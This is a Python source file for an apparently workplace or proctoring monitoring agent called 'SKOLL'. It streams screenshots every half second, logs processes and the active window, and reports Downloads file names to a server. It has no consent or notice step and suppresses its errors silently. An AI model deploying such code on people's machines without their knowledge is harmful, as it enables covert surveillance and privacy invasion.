import os
import time
import base64
import io
import threading
import psutil
import pyautogui
import requests
import socketio

SERVER_URL = os.environ.get('SKOLL_SERVER', 'http://127.0.0.1:5000')
USER_ID = os.environ.get('SKOLL_USER_ID', '1')

sio = socketio.Client()

def screenshot_stream():
    while True:
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        b64 = base64.b64encode(buf.getvalue()).decode('ascii')
        sio.emit('agent_screenshot', {'user_id': USER_ID, 'image_base64': b64})
        time.sleep(0.5)

def system_monitor():
    while True:
        try:
            active = ''
            try:
                import win32gui
                active = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            except Exception:
                pass
            for p in psutil.process_iter(['name', 'cpu_percent']):
                data = {
                    'user_id': USER_ID,
                    'process_name': p.info.get('name') or '',
                    'cpu_usage': p.info.get('cpu_percent') or 0.0,
                    'window_title': active
                }
                requests.post(f'{SERVER_URL}/api/system-log', json=data, timeout=2)
        except Exception:
            pass
        time.sleep(1.0)

def ai_reporter():
    while True:
        try:
            downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
            for root, _, files in os.walk(downloads):
                for f in files:
                    payload = {
                        'user_id': USER_ID,
                        'process_name': 'file-system',
                        'action': 'download',
                        'file_name': f
                    }
                    requests.post(f'{SERVER_URL}/api/ai-score', json=payload, timeout=2)
            time.sleep(5)
        except Exception:
            time.sleep(5)

def main():
    sio.connect(SERVER_URL)
    sio.emit('agent_hello', {'user_id': USER_ID})
    threading.Thread(target=screenshot_stream, daemon=True).start()
    threading.Thread(target=system_monitor, daemon=True).start()
    threading.Thread(target=ai_reporter, daemon=True).start()
    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()
